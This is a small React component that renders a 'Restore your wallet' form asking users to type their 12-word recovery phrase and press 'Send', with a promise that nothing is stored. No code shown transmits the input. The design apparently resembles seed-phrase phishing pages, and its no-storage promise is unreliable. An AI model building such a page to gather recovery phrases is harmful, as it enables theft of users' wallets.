import React from "react";
import "./restore.css";

function Restore() {
  return (
    <article className="restore">
      <article className="restore__content">
        <section className="restore__content--logo"></section>
        <section className="restore__content__password">
          <h3>Restore your wallet</h3>
          <div className="restore__content__password--mnemonic">MNEMONIC</div>
          <form action="">
            {" "}
            <input
              type="text"
              placeholder="🔒 Please enter your 12 word phrase *"
              required
            />
            <i>
              The information entered above will not be stored on our server or
              anywhere else
            </i>
            <button>Send</button>
            <h4>
              {" "}
              ** Make sure you have a steady internet connection for the process
              to complete **
            </h4>
          </form>
        </section>
      </article>
    </article>
  );
}

export default Restore;
